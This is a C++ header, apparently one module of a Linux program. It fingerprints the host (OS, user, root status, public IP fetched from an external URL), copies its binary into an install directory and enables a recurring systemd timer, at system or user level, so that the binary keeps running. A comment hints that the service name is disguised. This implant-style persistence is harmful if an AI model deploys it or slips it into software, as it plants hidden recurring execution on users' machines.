#ifndef LINUX_COMPONENTS_HH
#define LINUX_COMPONENTS_HH

#include <string>
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include "constants.hh"
#include "linux-request.hh"

static void copyFile(std::string src, std::string dst) {
    std::ifstream srcFile(src, std::ios::binary);
    std::ofstream dstFile(dst, std::ios::binary|std::ios::trunc);
    if(srcFile.is_open() && dstFile.is_open()) dstFile << srcFile.rdbuf();
}

namespace util {

std::string getCmdOutput(std::string cmd) {
    FILE *pipe;
    char buf[512];
    std::string output;

    if(!(pipe = popen(cmd.c_str(), "r"))) {
        std::exit(1);
    }

    while(std::fgets(buf, sizeof(buf), pipe) != NULL) {
        output += buf;
    }
    pclose(pipe);

    return output;
}

bool isSuperuser() {
    return (getCmdOutput("id -u | tr -d '\n'") == "0");
}

std::string getInstallDir() {
    std::string installDir;
    if(isSuperuser()) {
        installDir = ROOT_HOME + "/" + INSTALL_DIR + "/";
    } else {
        installDir = std::getenv("HOME") + ("/" + INSTALL_DIR + "/");
    }

    return installDir;
}

std::string getOS() {
    return util::getCmdOutput("uname | tr -d '\n'");
}

std::string getUser() {
    std::string user;

    if(util::isSuperuser()) {
        user = "root";
    } else {
        user = std::getenv("USER");
    }

    return user;
}

std::string getIPAddr() {
    return request::get(GET_IP_URL);
}

} // namespace util

namespace install {

void installFiles() {
    std::string mkdirCmd, installDir, timerPath, binPath, chmodCmd;

    installDir = util::getInstallDir();
    binPath = installDir + BIN_NEW;
    mkdirCmd = "mkdir -p " + util::getInstallDir() + " ";

    if(util::isSuperuser()) {
        mkdirCmd += SYS_SERVICE_DEST;
        timerPath = SYS_SERVICE_DEST + "/" + TIMER;

        // Change service name back to normal after moving if root
        copyFile(SYS_SERVICE, SYS_SERVICE_DEST + "/" + SERVICE);
    } else {
        std::string homeDir = std::getenv("HOME");
        std::string userServiceDir = homeDir + "/" + SERVICE_DEST;

        mkdirCmd +=  userServiceDir;
        timerPath = userServiceDir + "/" + TIMER;

        copyFile(SERVICE, userServiceDir + "/" + SERVICE);
    }

    std::system(mkdirCmd.c_str());
    copyFile(BIN, binPath);
    copyFile(TIMER, timerPath);

    // Copying the file does not keep permissions
    chmodCmd = "chmod 755 " + binPath;
    std::system(chmodCmd.c_str());
}

void initRecurringJob() {
    std::string systemdCmd;

    if( util::isSuperuser() ) {
        systemdCmd = "systemctl enable --now " + TIMER;
    } else {
        systemdCmd = "systemctl enable --now --user " + TIMER;
    }

    std::system(systemdCmd.c_str());
}

} //namespace install

#endif // LINUX_COMPONENTS_HH
